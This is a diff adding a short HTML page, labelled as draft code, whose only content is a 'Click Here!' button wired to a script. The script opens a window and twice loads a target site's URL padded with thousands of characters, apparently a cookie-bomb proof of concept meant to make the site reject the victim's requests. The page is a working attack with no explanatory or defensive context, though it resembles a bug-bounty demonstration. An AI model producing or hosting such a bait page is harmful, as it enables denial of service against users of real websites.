@@ -1,0 +1,22 @@
+<html>
+    <head>
+        <!-- draft code -->
+        <script>
+            bomb.onclick = function() {
+                var handler = open();
+
+                handler.location = "https://target.com/?cookie=?" + Array(3900).join(0);
+
+                setTimeout(function() {
+                    handler.location = "https://target.com/?cookie=?" + Array(3900).join(0);
+                    setTimeout(function() {
+                        handler.close();
+                    }, 1e3);
+                }, 1e3);
+            }
+        </script>
+    </head>
+    <body>
+        <button id="bomb">Click Here!</button>
+    </body>
+</html>
